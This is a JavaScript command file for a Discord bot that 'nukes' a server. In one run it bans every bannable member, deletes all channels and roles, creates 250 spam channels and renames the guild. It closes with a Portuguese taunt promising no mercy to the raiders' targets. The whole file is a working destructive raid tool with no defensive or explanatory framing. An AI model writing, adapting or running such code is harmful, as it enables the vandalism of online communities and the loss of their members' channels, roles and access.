const Discord = require('discord.js');
const colors = require('colors');
const config = require('../config.json')

module.exports.run = async (client, msg, args) => {
    msg.delete();
    console.clear();
    console.log('[info] Baning everyone on the guild...'.red);
    console.log(' ');
    await msg.guild.members.filter(member => member.bannable)
    .forEach(member => member.ban());
    console.log(`[sucess] Everyone on the guild was banned.`.green);
    console.log(' ');
    console.log(`[info] Deleting every channel of the guild...`.red);
    await msg.guild.channels.deleteAll();
    console.log(' ');
    console.log(`[sucess] Every channel of the guild was deleted.`.green);
    console.log(' ')
    console.log('[info] Creating spam channels...'.red);
    for(i = 0; i < 250; i++){
        await msg.guild.createChannel(config.nameChannels);
    }
    console.log(' ');
    console.log('[sucess] Spam channels created.'.green);
    console.log(' ');
    console.log('[info] Changing guild name.'.red);
    console.log(' ');
    await msg.guild.setName(config.nameGuild)
    .then(updated => console.log(`[sucess] Guild name changed to ${updated.name}.`.green))
    .catch(console.error);
    console.log(' ');
    console.log('[info] Deleting roles...'.red);
    await msg.guild.roles.deleteAll();
    console.log(' ');
    console.log('[sucess] All roles was deleted.'.green)
    console.log(' ')
    console.log('[!] Que deus tenho piedade daqueles que mexeram conosco, pois nós mesmos, infelizmente, não teremos.'.blue);
}
